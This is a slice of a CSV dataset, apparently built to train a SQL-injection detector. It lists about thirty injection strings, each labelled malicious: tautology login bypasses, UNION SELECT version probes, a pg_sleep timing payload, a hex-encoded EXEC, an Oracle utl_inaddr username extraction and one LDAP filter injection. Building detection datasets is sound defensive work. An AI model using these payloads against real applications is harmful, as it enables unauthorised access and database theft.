row_index,payload_norm,label,sqli_type_hint
630,"select * from users where id = 1 + @<1# union select 1,version ( ) -- 1",1,
631,admin' ) or ( '1' = '1'#,1,
632,select * from users where id = '1' or !<@ or 1 = 1 -- 1',1,
633,; or '1' = '1',1,
634,declare @q nvarchar ( 200 ) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ),1,
635,"admin"" #",1,
636,select * from users where id = 1 % ( 1 ) or 1 = 1 -- 1,1,
637,"select * from users where id = '1' or \< = 1 union select 1,@@VERSION -- 1'",1,
638,"select * from users where id = 1 or @#"" ( = 1 or 1 = 1 -- 1",1,
639,; begin declare @var varchar ( 8000 ) set @var = ' ...,1,
640,select * from users where id = 1 + \+%$ or 1 = 1 -- 1,1,
641,) or pg_sleep ( __TIME__ ) --,1,
642,PRINT @@variable,1,
643,"select * from users where id = 1 or @#"". = 1 or 1 = 1 -- 1",1,
644,or a = a--,1,
645,or 'x' = 'x,1,
646,"select * from users where id = 1 or ""1{"" or 1 = 1 -- 1",1,
647,a' or 1 = 1; --,1,
648,"select * from users where id = '1' or $<\ union select 1,@@VERSION -- 1'",1,
649,select * from users where id = 1 % ( \ ) or 1 = 1 -- 1,1,
650,""" or """"-""",1,
651,*(|(mail=*)),1,
652,"select * from users where id = 1 or "" ( _"" or 1 = 1 -- 1",1,
653,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 3 ) ) AND 'i' = 'i",1,
654,"select * from users where id = 1 or \.<$ union select 1,@@VERSION -- 1",1,
655,"admin"" ) or ""1"" = ""1""#",1,
656,"select * from users where id = 1 or 1#""1 union select null,version ( ) -- 1",1,
657,"select * from users where id = '1' union select 1,banner from v$version where rownum = 1 -- 1'",1,
658,""" ) or ( ""x"" ) = ( ""x",1,
659,23 OR 1 = 1,1,
